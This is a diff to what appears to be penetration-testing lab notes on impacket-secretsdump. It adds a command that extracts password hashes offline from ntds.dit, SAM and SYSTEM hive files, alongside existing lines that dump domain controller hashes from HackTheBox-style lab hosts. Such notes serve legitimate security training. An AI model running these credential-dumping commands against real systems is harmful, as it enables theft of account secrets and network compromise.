@@ -57,6 +57,12 @@ impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOC
 impacket-secretsdump -outputfile htb_local_hashes -just-dc htb/john@10.129.8.96
 ```
 
+Dump hashes from ntds.dit file, sam.sav and system.sav:
+
+```shell
+impacket-secretsdump -outputfile ntds_hashes -ntds ntds.dit -sam SAM.SAV -system SYSTEM.SAV local
+```
+
 ## Permissions Required
 
 | Privilege               | Local Machine (SAM)  | Domain Controller (NTDS.dit) |
